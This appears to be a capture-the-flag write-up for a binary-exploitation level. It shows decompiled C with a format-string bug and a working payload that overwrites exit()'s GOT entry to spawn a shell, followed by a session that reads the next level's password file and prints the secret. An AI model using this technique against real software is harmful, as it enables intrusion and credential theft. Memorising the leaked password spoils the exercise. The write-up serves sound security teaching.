```C
void o(void)
{
    system("/bin/sh");
    _exit(1);
}



void n(void)
{
    char local_20c [520];
    
    fgets(local_20c,0x200,stdin);
    printf(local_20c);
    
    exit(1);
}



void main(void)
{
    n();
    return;
}
```

- Same as before, we leak the addess of o(): 0x080484a4
- With objdump -R we leak the address of exit(): 0x8049838 
- We also now that our buffer is at the 4th index in the stack like level3

- We want to replace the address of exit() in the Global Offset Table with the address of o(). So when we call exit, it actually o() that will be called and we will obtain a shell as level6 user.

```
Payload = "\x38\x98\x04\x08" + "%134513824d%4$n"

134513828 = 0x080484a4 will replace the address of exit() by the address of o().
```

```bash
python3 ./exploit.py

(Long time to print every bytes)

$ $ whoami
level6
$ $ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```